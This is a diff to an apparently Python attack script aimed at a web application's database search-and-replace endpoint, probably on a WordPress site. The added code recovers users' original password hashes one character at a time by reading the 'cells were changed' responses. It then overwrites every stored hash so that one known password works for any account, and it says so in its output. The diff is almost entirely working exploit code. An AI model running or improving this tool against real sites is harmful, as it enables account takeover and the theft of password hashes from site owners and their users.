@@ -31,7 +31,8 @@ class Target(object):
 		data = urllib.urlencode(values)
 		response = urllib2.urlopen(self.url+"?step=5",data)
 		html = response.read()
-		time.sleep(.050)
+		time.sleep(0.03)
+		return html
 
 	def attack_sequence(self,method):
 
@@ -124,14 +125,34 @@ class Target(object):
 		Target.good("Using the password-only replacement")
 		Target.info("This is the cleanest, but longest method!")
 
+		progress_width = 30
+		sys.stdout.write("[%s]" % ("\x20" * progress_width))
+		sys.stdout.flush()
+		sys.stdout.write("\b" * (progress_width+1))
+		sys.stdout.write("-")
+		sys.stdout.flush()
+		original_hash = "$P$B"
 		for x in self.ALPHABET:
-			self.replace("$P$B"+x,'$P$B$')
+			html = self.replace("$P$B"+x,'$P$B$')
+			if "<strong>0</strong> cells were changed" not in html:
+				original_hash = original_hash+x
+				break
+			
 
-		for x in range(0,34):
-			Target.info(str(x+1)+"/"+str(29))
+		for y in range(0,29):
+			sys.stdout.write("-")
+			sys.stdout.flush()
 			for x in self.ALPHABET:
-				self.replace("$P$B$"+x,'$P$B$')
+				html = self.replace("$P$B$"+x,'$P$B$')
+				if "<strong>0</strong> cells were changed" not in html:
+					original_hash = original_hash+x
+					break
+		if len(original_hash) == 34:
+			Target.good("We did it Reddit! Original hash was "+original_hash)
+			
 		self.replace("$P$B$",self.PASSWORD_HASH)
+		sys.stdout.write("\n")
+		Target.good("You can login with any user and password "+self.password)
 
 	def keep_user(self):
 		Target.good("Saving user '"+self.user+"'")
